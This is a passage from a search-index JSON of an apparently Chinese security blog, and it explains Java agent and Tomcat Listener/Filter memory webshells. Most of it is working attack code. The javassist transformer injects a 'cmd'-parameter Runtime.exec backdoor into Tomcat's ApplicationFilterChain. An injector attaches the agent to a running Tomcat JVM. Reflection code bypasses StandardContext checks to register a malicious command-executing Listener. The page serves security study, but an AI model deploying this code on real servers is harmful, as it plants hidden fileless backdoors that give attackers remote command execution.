\u65b9\u6cd5\u5904\u7406\u3002","title":"retransformClasses&#x20;"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#demo","text":"\u5bf9\u4e0a\u9762\u7684\u4e09\u4e2a\u65b9\u6cd5\u53ef\u80fd\u6709\u4e86\u70b9\u61f5\u61f5\u61c2\u61c2\u7684\u611f\u89c9\uff0c\u4e0b\u9762\u4f1a\u901a\u8fc7\u4e00\u4e2a\u5185\u5b58\u9a6cDemo\u6765\u66f4\u6df1\u523b\u7684\u8ba4\u8bc6agent\u662f\u5982\u4f55\u4fee\u6539\u5b57\u8282\u7801\u7684\u3002 \u8fd9\u91cc\u76f4\u63a5\u501f\u7528\u6728\u5934\u5e08\u5085\u7684\u56fe\u7247 \u8fd9\u91cc\u7684\u610f\u601d\u662f\u4fbf\u662f\uff1a\u5f53\u52a0\u8f7d\u5230\u6307\u5b9a\u7c7b\u65f6\uff0c\u901a\u8fc7javassist\u6280\u672f\u4fee\u6539\u5176\u5b57\u8282\u7801\uff0c\u5c06\u6076\u610f\u4ee3\u7801\u8fdb\u884c\u690d\u5165\uff0c\u4ece\u800c\u8fbe\u5230\u4e86\u5185\u5b58\u9a6c\u7684\u76ee\u7684\u3002","title":"Demo"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#agent","text":"\u8fd9\u91cc\u4ee5tomcat Filter \u5185\u5b58\u9a6c\u4e3a\u4f8b\uff0c\u901a\u8fc7agent\u6280\u672f\u5411\u5176\u6ce8\u5165\u5185\u5b58\u9a6c\u3002 tomcat \u8c03\u7528Filter\u7684\u6808\u5e27\u987a\u5e8f\u5982\u4e0b \u4ece\u56fe\u4e2d\u53ef\u4ee5\u770b\u89c1\u5b83\u8c03\u7528\u4e86ApplicationFilterChain#doFilter,\u8fd9\u4e2a\u65b9\u6cd5\u7684\u4ee3\u7801\u5982\u4e0b \u5b83\u8c03\u7528\u4e86internalDofilter\u5e76\u4f20\u5165\u4e86request,response\u53c2\u6570\u8fdb\u5165\u4e86\u4e0b\u4e00\u5c42\uff0c\u5f00\u59cb\u8c03\u7528filterchain\u4e2d\u5404filter\u5bf9\u8c61\u7684Dofilter\u65b9\u6cd5\u3002 \u4e0d\u8fc7\u6211\u4eec\u60f3\u8fdb\u884cagent\u6ce8\u5165\uff0c\u5b8c\u5168\u4e0d\u7528\u5230filterchain\u91cc\u53bb\u505a\u6587\u7ae0\uff0c\u53ea\u9700\u8981\u4fee\u6539ApplicationFilterChain#doFilter\u8fd9\u4e2a\u65b9\u6cd5\u5373\u53ef\u3002 filterchain\u4e2d\u5404filter\u5bf9\u8c61\u8c03\u7528Dofilter\u65b9\u6cd5\u6240\u9700\u8981\u7684\u53c2\u6570\u4ec5\u4ec5\u53ea\u8981request\uff0cresponse\u548cfilterchain \u800c\u5176\u4e2dfilterchain\u5c5e\u6027\u7684\u4f5c\u7528\u4ec5\u4ec5\u662f\u53bb\u8c03\u7528filterchain\u4e2d\u4e0b\u4e00\u4e2afilter\u7684Dofilter\u65b9\u6cd5\uff0c\u6240\u4ee5\u5b9e\u9645\u4e0a\u88abDofilter\u65b9\u6cd5\u8c03\u7528\u6765\u5904\u7406\u7528\u6237\u8bf7\u6c42\u7684\u53c2\u6570\u53ea\u6709response\u548crequest. \u4e0b\u56fe\u662f\u4e00\u4e2afilter\u5185\u5b58\u9a6c\uff0c\u53ef\u4ee5\u53d1\u73b0\u5185\u5b58\u9a6c\u4ec5\u5728request\u548cresponse\u4e0a\u505a\u4e86\u6587\u7ae0\u3002 \u800c\u5728ApplicationFilterChain#doFilter\u4e2d\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86request\u548cresponse\u5c5e\u6027\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539ApplicationFilterChain#doFilter\u5b57\u8282\u7801\u5411\u5176\u5199\u5165\u5185\u5b58\u9a6c\u3002","title":"agent\u5185\u5b58\u9a6c\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#_7","text":"\u6211\u4eec\u5148\u5199\u597dagent\u548cTransformer\u3002 \u6211\u4eec\u62e6\u622a\u7c7bApplicationFilterChain\uff0c\u53bb\u4fee\u6539\u5b83\u7684\u65b9\u6cd5DoFilter\u3002 import java.lang.instrument.Instrumentation; public class AgentMain { public static final String ClassName = \"org.apache.catalina.core.ApplicationFilterChain\"; public static void agentmain(String agentArgs, Instrumentation ins) { ins.addTransformer(new DefineTransformer(),true); // \u83b7\u53d6\u6240\u6709\u5df2\u52a0\u8f7d\u7684\u7c7b Class[] classes = ins.getAllLoadedClasses(); for (Class clas:classes){ if (clas.getName().equals(ClassName)){ try{ // \u5bf9\u7c7b\u8fdb\u884c\u91cd\u65b0\u5b9a\u4e49 ins.retransformClasses(new Class[]{clas}); } catch (Exception e){ e.printStackTrace(); } } } } } import java.lang.instrument.ClassFileTransformer; import java.security.ProtectionDomain; import javassist.*; public class DefineTransformer implements ClassFileTransformer { public static final String ClassName = \"org.apache.catalina.core.ApplicationFilterChain\"; public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) { System.out.println(\"transform begin\"); className = className.replace(\"/\",\".\"); if (className.equals(ClassName)){ System.out.println(\"Find the Inject Class: \" + ClassName); ClassPool pool = ClassPool.getDefault(); if (classBeingRedefined != null) { //\u8fd9\u4e2a\u5730\u65b9\u5fc5\u987b\u52a0\uff0c\u5b83\u548c\u83b7\u53d6\u76f8\u5e94ClassLoader\u6709\u5173\uff0c\u4e0d\u52a0\u5c31\u6709\u53ef\u80fd\u51fa\u73b0javassist.NotFoundException \u9519\u8bef ClassClassPath classPath = new ClassClassPath(classBeingRedefined); pool.insertClassPath(classPath); } try { CtClass c = pool.getCtClass(className); CtMethod m = c.getDeclaredMethod(\"doFilter\"); m.insertBefore(\"System.out.println(321);\\n\"+ \"javax.servlet.http.HttpServletRequest req = request;\\n\" + \"javax.servlet.http.HttpServletResponse res = response;\\n\" + \"java.lang.String cmd = request.getParameter(\\\"cmd\\\");\\n\" + \"if (cmd != null){\\n\" + \" try {\\n\" + \" java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\\n\" + \" java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\\n\" + \" String line;\\n\" + \" StringBuilder sb = new StringBuilder(\\\"\\\");\\n\" + \" while ((line=reader.readLine()) != null){\\n\" + \" sb.append(line).append(\\\"\\\\n\\\");\\n\" + \" }\\n\" + \" response.getOutputStream().print(sb.toString());\\n\" + \" response.getOutputStream().flush();\\n\" + \" response.getOutputStream().close();\\n\" + \" } catch (Exception e){\\n\" + \" e.printStackTrace();\\n\" + \" }\\n\" + \"}\"); byte[] bytes = c.toBytecode(); c.detach(); return bytes; } catch (Exception e){ e.printStackTrace(); } } return new byte[0]; } } \u7136\u540e\u6253\u5305\u6210jar,\u6211\u8fd9\u91cc\u662f\u7528 \u547d\u4ee4mvn assembly:assembly\u6253\u5305\u7684\uff0cpom\u957f\u8fd9\u6837 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"> <modelVersion>4.0.0</modelVersion> <build> <plugins> <plugin> <artifactId>maven-assembly-plugin</artifactId> <configuration> <descriptorRefs> <descriptorRef>jar-with-dependencies</descriptorRef> </descriptorRefs> <archive> <manifestEntries> <Premain-Class>agen</Premain-Class> <Agent-Class>agen</Agent-Class> <Can-Redefine-Classes>true</Can-Redefine-Classes> <Can-Retransform-Classes>true</Can-Retransform-Classes> </manifestEntries> </archive> </configuration> </plugin> </plugins> </build> <groupId>groupId</groupId> <artifactId>agen</artifactId> <version>1.0-SNAPSHOT</version> <dependencies> <dependency> <groupId>javassist</groupId> <artifactId>javassist</artifactId> <version>3.12.1.GA</version> </dependency> </dependencies> </project> \u7136\u540e\u5199\u6ce8\u5165\u5668 import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class inject{ public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { String id = args[0]; String jarName = args[1]; System.out.println(\"id ==> \" + id); System.out.println(\"jarName ==> \" + jarName); VirtualMachine virtualMachine = VirtualMachine.attach(id); virtualMachine.loadAgent(jarName); virtualMachine.detach(); //\u65ad\u5f00\u4e0e\u76ee\u6807JVM\u7684\u94fe\u63a5 System.out.println(\"ends\"); } } \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u628a\u6ce8\u5165\u5668\u6253\u5305\u6210jar\uff0c\u5c06\u6ce8\u5165\u5668\u548cjavaagent\u90fd\u4e0a\u4f20\u5230\u76ee\u6807\u673a\u5668\u4e0a\uff0c\u901a\u8fc7\u6ce8\u5165\u5668\u5c06agent\u6ce8\u5165\u5230\u76ee\u6807tomcat\u4e2d\u751f\u6210filter\u5185\u5b58\u9a6c\u3002 \u4e5f\u53ef\u4ee5\u53ea\u4e0a\u4f20agent\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u63a5\u53e3\u8fdb\u884c\u547d\u4ee4\u6267\u884c\uff0c\u4ee5\u6b64\u6765\u6267\u884c\u6211\u4eec\u6ce8\u5165\u5668\u7684\u547d\u4ee4\u5c06agent\u6ce8\u5165\u5230tomcat\u4e2d\u751f\u6210filter\u5185\u5b58\u9a6c\u3002 \u5982\u679c\u51fa\u73b0\u7c7b\u627e\u4e0d\u5230\u7684\u60c5\u51b5\uff0c\u5219\u9700\u8981\u901a\u8fc7URLClassLoader+\u53cd\u5c04\u52a0\u8f7d\u6211\u4eec\u6240\u9700\u8981\u7684\u7c7b\u3002 \u8fd9\u91cc\u76f4\u63a5\u501f\u7528\u6728\u5934\u5e08\u5085\u5199\u597d\u7684 URLClassLoader+\u53cd\u5c04\u52a0\u8f7d \u7684\u6ce8\u5165\u5668 package main.java; import java.io.IOException; import java.lang.reflect.Method; import java.util.List; public class inject { public static void main(String[] args) throws Exception{ try{ java.lang.String path = \"E:\\\\tools\\\\java\\\\idea\\\\agen\\\\target\\\\agen-1.0-SNAPSHOT-jar-with-dependencies.jar\"; //\u8fd9\u91cc\u662f\u53bb\u52a0\u8f7d\u6ce8\u5165\u5668\u6240\u9700\u8981\u7684tools.jar\uff0c\u5bf9\u5e94\u7c7b\u4e3acom.sun.tools java.io.File toolsPath = new java.io.File(System.getProperty(\"java.home\").replace(\"jre\",\"lib\") + java.io.File.separator + \"tools.jar\"); java.net.URL url = toolsPath.toURI().toURL(); java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url}); Class/*<?>*/ MyVirtualMachine = classLoader.loadClass(\"com.sun.tools.attach.VirtualMachine\"); Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass(\"com.sun.tools.attach.VirtualMachineDescriptor\"); java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod(\"list\",null); java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine,null); System.out.println(\"Running JVM list ...\"); for(int i=0;i<list.size();i++){ Object o = list.get(i); java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod(\"displayName\",null); java.lang.String name = (java.lang.String) displayName.invoke(o,null); System.out.println(name); // \u5217\u51fa\u5f53\u524d\u6709\u54ea\u4e9b JVM \u8fdb\u7a0b\u5728\u8fd0\u884c // \u8fd9\u91cc\u7684 if \u6761\u4ef6\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u66f4\u6539 if (name.contains(\"org.apache.catalina.startup.Bootstrap start\")){ // \u83b7\u53d6\u5bf9\u5e94\u8fdb\u7a0b\u7684 pid \u53f7 java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod(\"id\",null); java.lang.String id = (java.lang.String) getId.invoke(o,null); System.out.println(\"id >>> \" + id); java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod(\"attach\",new Class[]{java.lang.String.class}); java.lang.Object vm = attach.invoke(o,new Object[]{id}); java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod(\"loadAgent\",new Class[]{java.lang.String.class}); loadAgent.invoke(vm,new Object[]{path}); java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod(\"detach\",null); detach.invoke(vm,null); System.out.println(\"Agent.jar Inject Success !!\"); break; } } } catch (Exception e){ e.printStackTrace(); } } } \u8fd9\u91cc\u662f\u9009\u62e9\u628a\u6ce8\u5165\u5668\u6253\u5305\u6210jar\u7528\uff0c\u7528Manifest\u6253\u5305\uff08\u4e3b\u8981\u662fmaven\u8fd8\u6ca1\u73a9\u660e\u767d\uff09\uff0c\u4e0a\u6587\u6709\u6709\u5173Manifest\u7684\u76f8\u5173\u6b65\u9aa4\uff0c\u6240\u4ee5\u6b64\u5904\u5177\u4f53\u6b65\u9aa4\u7701\u7565\u4e86\u3002 \u7136\u540e\u901a\u8fc7\u6ce8\u5c04\u5668\u5c06agent\u6ce8\u5165\u5230tomcat\u4e2d","title":"\u5b9e\u64cd"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#_8","text":"\u5728transfrom\u65b9\u6cd5\u4e2d\u6211\u4eec\u5199\u4e86\u8fd9\u4e00\u6bb5\u4ee3\u7801 if (classBeingRedefined != null) { //\u8fd9\u4e2a\u5730\u65b9\u5fc5\u987b\u52a0\uff0c\u5b83\u548c\u83b7\u53d6\u76f8\u5e94ClassLoader\u6709\u5173\uff0c\u4e0d\u52a0\u5c31\u6709\u53ef\u80fd\u51fa\u73b0javassist.NotFoundException \u9519\u8bef ClassClassPath classPath = new ClassClassPath(classBeingRedefined); pool.insertClassPath(classPath); } \u5982\u679c\u4e0d\u52a0\u8fd9\u4e00\u6bb5\u7684\u8bdd\u5c31\u4f1a\u62a5\u9519 javassist.NotFoundException:org.apache.catalina.core.ApplicationFilterChain \u539f\u56e0\u662f\u8fd9\u6837\u7684 \u201cClassPool.getDefault() \u65b9\u6cd5\u7684\u641c\u7d22Classpath \u53ea\u662f\u641c\u7d22JVM\u7684\u540c\u8def\u5f84\u4e0b\u7684class\u3002\u5f53\u4e00\u4e2a\u7a0b\u5e8f\u8fd0\u884c\u5728JBoss\u6216\u8005Tomcat\u4e0b\uff0cClassPool Object \u53ef\u80fd\u627e\u5230\u7528\u6237\u7684classes\u3002Javassist \u63d0\u4f9b\u4e86\u56db\u79cd\u52a8\u6001\u52a0\u8f7dclasspath\u7684\u65b9\u6cd5\u3002\u201d \u5982\u679c\u4ec5\u4ec5\u9760\u4e00\u4e2agetDefault\uff0c\u662f\u65e0\u6cd5\u83b7\u53d6\u5230tomcat\u7684\u7c7b\u7684\uff0c\u56e0\u4e3atomcat\u7684\u7c7b\u5e76\u6ca1\u6709\u5b58\u653e\u5728JVM\u540c\u8def\u5f84\u4e0b\u3002 \u8981\u89e3\u51b3\u8fd9\u4e2a\u65b9\u6cd5\u5f88\u7b80\u5355\uff0c\u9996\u5148\u6211\u4eec\u770b\u4e00\u4e0btransform\u63d0\u4f9b\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u5b9a\u4e49 classBeingRedefined: if this is triggered by a redefine or retransform, the class being redefined or retransformed; if this is a class load, null \u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f\uff0c\u5982\u679c\u5f53\u524dtransform\u6240\u5904\u7406\u7684\u5bf9\u8c61\u662f\u5df2\u52a0\u8f7d\u8fc7\u7684\u7c7b\uff0c\u90a3\u4e48\u8fd9\u4e2a\u53c2\u6570\u7684\u503c\u4fbf\u662f\u5f53\u524d\u6240\u5904\u7406\u7684\u5bf9\u8c61\uff1b\u5982\u679c\u662f\u65b0\u52a0\u8f7d\u7684\u7c7b\uff0c\u5219\u4e3anull \u56e0\u4e3aorg.apache.catalina.core.ApplicationFilterChain\u5728agent\u6ce8\u5165\u65f6\u80af\u5b9a\u662f\u5df2\u7ecf\u52a0\u8f7d\u8fc7\u4e86\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u8fd9\u4e2a\u53c2\u6570\u6765\u83b7\u5f97org.apache.catalina.core.ApplicationFilterChain\u7684class\u5bf9\u8c61\uff0c\u7136\u540e\u5c06\u5176\u8bbe\u7f6e\u4e3ajavassist\u4e2dClassPool\u7684ClassPath\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u51fa\u73b0 javassist.NotFoundException\u4e86\u3002 2.maven\u6253\u5305\u7684\u4f7f\u7528\uff0c\u8fd8\u5f97\u597d\u597d\u770b\u770b\uff0c\u6298\u817e\u4e86\u597d\u534a\u5929","title":"\u5751\u70b9"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/","text":"tomcat Listener\uff0cFilter\u5185\u5b58\u9a6c\u7b80\u8981\u5206\u6790 \u76ee\u5f55 tomcat \u5bb9\u5668 Listener \u5185\u5b58\u9a6c ServletContext ApplicationContext \u7f16\u5199Listener\u5185\u5b58\u9a6c Filter \u5185\u5b58\u9a6c doFilter\u65b9\u6cd5\u5982\u4f55\u88ab\u6267\u884c\uff1f \u914d\u7f6efilter filterchain filterconfig\u4e0efilterdef \u4e0b\u9762\u7684\u4e24\u5c42 \u52a0\u8f7d\u8fc7\u7a0b\u6d41\u7a0b\u56fe FilterDef\u6dfb\u52a0 \u7f16\u5199Filter\u5185\u5b58\u9a6c \u603b\u7ed3 \u53c2\u8003 tomcat \u5bb9\u5668 tomcat \u4e3b\u8981\u5305\u542b\u56db\u79cd\u5bb9\u5668\uff1aEngine\uff0cHost\uff0cContext\uff0cWrapper\u3002\u5176\u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\u56fe \u8be6\u7ec6\u89e3\u8bfb\u4e00\u4e0b\u8fd9\u4e2a\u56fe\u3002 \u4e00\u53f0\u670d\u52a1\u5668\u4e0a\u662f\u53ef\u4ee5\u914d\u7f6e\u591a\u4e2a\u7ad9\u70b9\u7684\uff0c\u5bf9\u4e8etomcat\u6765\u8bf4\uff0c\u6bcf\u4e00\u4e2a\u7ad9\u70b9\u5c31\u5bf9\u5e94\u4e00\u4e2aHOST\u3002 \u4e00\u4e2a\u7ad9\u70b9\u4e0a\u662f\u53ef\u4ee5\u914d\u7f6e\u591a\u4e2aWEB\u5e94\u7528\u7684\uff0c\u6bd4\u5982\u8bf4\u4e00\u4e2a\u7ad9\u70b9\u53ef\u80fd\u4f1a\u6709OA\uff0cSSO\uff0c\u90ae\u4ef6\u5e94\u7528\u7b49\u7b49WEB\u5e94\u7528\uff0c\u5bf9\u4e8etomcat\u6765\u8bf4\u6bcf\u4e00\u4e2aWEB\u5e94\u7528\u4fbf\u5bf9\u5e94\u7740\u4e00\u4e2aContext\u3002 \u4e00\u4e2aWEB\u5e94\u7528\u4e2d\u80af\u5b9a\u4e5f\u6709\u591a\u4e2a\u8bbf\u95ee\u8def\u5f84\uff0c\u6bd4\u5982\u8bf4OA\u53ef\u80fd\u5c31\u6709\u767b\u5f55\uff0c\u524d\u7aef\u5c55\u793a\uff0c\u641c\u7d22\u7b49\u3002\u6240\u4ee5\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u8bbf\u95ee\u8def\u5f84tomcat\u90fd\u4f1a\u5206\u914d\u4e00\u4e2aWrapper\uff0c\u6bcf\u4e00\u4e2aWrapper\u5bf9\u5e94\u4e00\u4e2aServlet\uff0c\u7528\u4e8e\u5904\u7406\u7279\u5b9a\u8bf7\u6c42\u3002 Listener \u5185\u5b58\u9a6c tomcat\u6536\u5230\u8bf7\u6c42\u65f6\uff0c\u5904\u7406\u987a\u5e8f\u662f Listener->Filter->Servlet\u3002 \u4e5f\u5c31\u662f\u8bf4Listener\u662f\u6700\u5148\u63a5\u89e6\u5230\u6570\u636e\u8bf7\u6c42\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5728Listener\u4e0a\u505a\u624b\u811a\u4ece\u800c\u8fbe\u5230\u5185\u5b58\u9a6c\u7684\u76ee\u7684\u3002 \u5b9e\u9645\u4e0a\uff0c\u6211\u4eec\u60f3\u5b9e\u73b0\u4e00\u4e2a\u5185\u5b58\u9a6c\uff0c\u601d\u8def\u4fbf\u662f\u60f3\u8ba9tomcat\u6267\u884c\u4e00\u6bb5\u6076\u610f\u7a0b\u5e8f\uff0c\u628a\u6076\u610f\u7684listener\u6216\u8005filter\u7c7b\u5199\u5165tomcat\u5185\u5b58\u4e2d\uff0c\u7531\u4e8etomcat\u5904\u7406\u8bf7\u6c42\u65f6\uff0c\u8bf7\u6c42\u4f1a\u88ablistener\u548cfilter\u5904\u7406\uff08\u4e5f\u5c31\u662f\u8bf4\u4f1a\u88ab\u6211\u4eec\u7684\u6076\u610f\u7c7b\u5904\u7406\uff09\uff0c\u56e0\u6b64\u8fbe\u5230\u9690\u853d\u7684\u6728\u9a6c\u529f\u80fd\u3002 \u5177\u4f53\u600e\u4e48\u4e2a\u5b9e\u73b0\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5927\u81f4\u60f3\u8c61\u4e00\u4e2a\u601d\u8def\uff1a\u83b7\u53d6\u670d\u52a1\u5668\u521d\u6b65\u6743\u9650\u540e\uff0c\u521b\u5efa\u4e00\u4e2aJSP\u5e76\u5411\u5185\u5199\u5165\u5411\u5185\u5b58\u6ce8\u5165\u6076\u610fListener\u6216filter\u7684\u4ee3\u7801\uff0c\u968f\u540e\u8bbf\u95eeJSP\u89e6\u53d1JSP\u4ee3\u7801\uff0c\u6076\u610fListener\u6216filter\u88ab\u6ce8\u5165\u5185\u5b58\uff0c\u968f\u540e\u5220\u9664JSP\uff0c\u901a\u8fc7\u6076\u610fListener\u6216filter\u5b9e\u73b0\u65e0\u6587\u4ef6webshell\u3002\u4f46\u662f\u7531\u4e8e\u4e00\u4e9b\u539f\u56e0\u5bfc\u81f4\u76f4\u63a5\u901a\u8fc7addListener\u6216\u8005addFilter\u6765\u6dfb\u52a0\u76d1\u542c\u5668\u6216\u8fc7\u6ee4\u5668\u4f1a\u62a5\u9519\uff0c\u5177\u4f53\u89e3\u51b3\u65b9\u6cd5\u5c31\u662f\u4e0b\u6587\u7684\u5185\u5bb9\u4e86\uff1a ServletContext \u5982\u679c\u6211\u4eec\u60f3\u6dfb\u52a0\u4e00\u4e2aListener\uff0c\u90a3\u4e48\u52bf\u5fc5\u4f1a\u7528\u5230\u4e00\u4e2a\u65b9\u6cd5\uff1aaddListener\u3002 \u6211\u4eec\u6765\u5206\u6790\u4ee5\u4e0b\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u60f3\u529e\u6cd5\u901a\u8fc7addListener\u65b9\u6cd5\u628a\u6076\u610fListener\u6ce8\u5165\u5185\u5b58\u3002 \u9996\u5148addListener\u65b9\u6cd5\u662f\u8fd9\u4e48\u7528\u7684\u3002 ServletContext servletContext = this.getServletConfig().getServletContext(); servletContext.addListener(\"\"); \u6211\u4eec\u76f4\u63a5\u8ddf\u8fdbaddListener\uff0c\u4f1a\u53d1\u73b0\u8ddf\u8fdb\u5230\u4e86ServletContext\u8fd9\u4e2a\u63a5\u53e3\u7c7b\u3002 \u90a3\u4e48\u5b9e\u73b0addListener\u7684\u7c7b\u662f\u4ec0\u4e48\u5462\uff1f\u6362\u53e5\u8bdd\u8bf4\uff0cservletContext\u8fd9\u4e2a\u5b9e\u4f8b\u5316\u5bf9\u8c61\u662f\u5982\u4f55\u88ab\u5b9e\u4f8b\u5316\u7684\u5462\uff1f ApplicationContext \u901a\u8fc7\u8c03\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0servletContext\u8fd9\u4e2a\u5bf9\u8c61\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2aApplicationContextFacade\u5bf9\u8c61\u3002 \u6211\u4eec\u8ddf\u8fdb\u5230ApplicationContextFacade.class\u4e2d\uff0c\u67e5\u770baddListener\u65b9\u6cd5\u7684\u5b9e\u73b0\u3002 \u53d1\u73b0\u5b9e\u9645\u4e0a\u662f\u8c03\u7528\u4e86ApplicationContext\u7c7b\u7684addListener\u65b9\u6cd5\u3002\u518d\u6b21\u8ddf\u8fdb\u3002 \u8fd9\u91cc\u8fd8\u8c03\u7528\u4e86\u4e00\u4e2aaddListener\uff0c\u518d\u6b21\u8ddf\u8fdb\u3002 \u8fd9\u91cc\u501f\u7528\u7684\u522b\u4eba\u7684\u56fe\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u670d\u52a1\u5668\u5df2\u542f\u52a8\uff0c\u90a3\u4e48\u901a\u8fc7\u76f4\u63a5\u8c03\u7528addListener\u662f\u65e0\u6cd5\u6dfb\u52a0\u76d1\u542c\u5668\u7684\u3002 \u7a76\u5176\u539f\u56e0\uff0c\u4fbf\u662f\u6b64\u5904\u7684context\u662fStandardContext\uff0c\u5b83\u7684\u72b6\u6001\u662f\u5f00\u59cb\u72b6\u6001\uff0c\u65e0\u6cd5\u5728if\u5224\u65ad\u4e2d\u8fd4\u56detrue\u3002 \u8fd9\u4e5f\u5c31\u662f\u4e0a\u6587\u63d0\u5230\u7684 \"\u4f46\u662f\u7531\u4e8e\u4e00\u4e9b\u539f\u56e0\u5bfc\u81f4\u76f4\u63a5\u901a\u8fc7addListener\u6216\u8005addFilter\u6765\u6dfb\u52a0\u76d1\u542c\u5668\u6216\u8fc7\u6ee4\u5668\u4f1a\u62a5\u9519\" \u5982\u679c\u80fd\u591f\u7a81\u7834if\u5224\u65ad\uff0c\u6765\u5230\u6b64\u5904\uff0c\u90a3\u4e48\u76d1\u542c\u5668\u5c31\u4f1a\u88ab\u987a\u5229\u7684\u6dfb\u52a0\u4e0a \u7f16\u5199Listener\u5185\u5b58\u9a6c \u65e2\u7136\u963b\u788d\u6211\u4eec\u6dfb\u52a0Listener\u7684\u539f\u56e0\u5df2\u7ecf\u627e\u5230\u4e86\uff0c\u90a3\u4e48\u5c31\u5e94\u8be5\u8003\u8651\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\u4e86\u3002 \u5f88\u7b80\u5355\uff0c\u901a\u8fc7\u53cd\u5c04\u5373\u53ef\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\u3002 \u5728\u7f16\u5199\u53cd\u5c04\u4ee3\u7801\u4e4b\u524d\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u53bb\u770b\u4e00\u4e0b\uff0c\u6211\u4eec\u600e\u6837\u624d\u80fd\u901a\u8fc7\u53cd\u5c04\"\u591f\u5230\"StandardContext\u7684addApplicationEventListener\u65b9\u6cd5\u3002 \u53ef\u4ee5\u76f4\u89c2\u7684\u770b\u5230\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7servletContext\u83b7\u5f97\u5b83\u7684context\u5c5e\u6027\uff08ApplicationContext\u5bf9\u8c61\uff09\uff0c\u7136\u540e\u901a\u8fc7ApplicationContext\u5bf9\u8c61\u7684context\u83b7\u5f97StandardContext\u5bf9\u8c61\uff0c\u7136\u540e\u8c03\u7528addApplicationEventListener\u65b9\u6cd5\u3002\u5f88\u597d\u3002 \u53cd\u5c04\u4ee3\u7801 ServletContext servletContext = this.getServletConfig().getServletContext(); Field field = servletContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext); field = applicationContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); standardContext.addApplicationEventListener(new MyListener(request,response)); //\u8fd9\u4e00\u884c\u662f\u5c06\u67d0\u4e2aListener\u7c7b\u6dfb\u52a0\u5230\u76d1\u542c\u5668 \u6076\u610fListener public class MyListenr implements ServletRequestListener { public ServletResponse response; public ServletRequest request; MyListenr(ServletRequest request, ServletResponse response) { this.request = request; this.response = response; } public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmder = request.getParameter(\"cmd\"); try { Process ps = Runtime.getRuntime().exec(cmder); BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while ((line = br.readLine()) != null) { 